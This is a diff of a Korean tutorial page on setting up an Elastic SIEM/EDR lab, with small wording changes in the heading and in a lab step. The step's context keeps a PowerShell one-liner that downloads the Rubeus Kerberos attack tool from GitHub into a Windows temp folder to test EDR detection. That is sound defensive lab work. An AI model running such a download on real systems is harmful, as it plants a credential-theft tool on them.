@@ -1,4 +1,4 @@
-# EDR 솔루션 설치
+# SIEM과 EDR 솔루션 설치
 
 이 페이지는 다음의 페이지와 비슷한 내용을 포함하고 있으니 영어가 편하신 분들은 확인하시기 바랍니다. \
 [https://www.elastic.co/security-labs/the-elastic-container-project](https://www.elastic.co/security-labs/the-elastic-container-project)&#x20;
@@ -107,7 +107,7 @@ Agent 설치 명령어가 끝나고 다시 Elastic 으로 돌아오면 Agent가 
 
 ### 실습&#x20;
 
-Elastic EDR 이 실제로 잘 작동하는지 확인하기 위해 EDR 에이전트가 설치된 테스트 윈도우 박스로 가서 악성코드를 실행해보자.&#x20;
+Elastic EDR 이 실제로 잘 작동하는지 확인하기 위해 EDR 에이전트가 설치된 테스트 윈도우 박스로 가서 악성코드를 실행해본다.&#x20;
 
 ```
 iex(new-object net.webclient).downloadfile('https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe','C:\windows\temp\rubeus.exe')
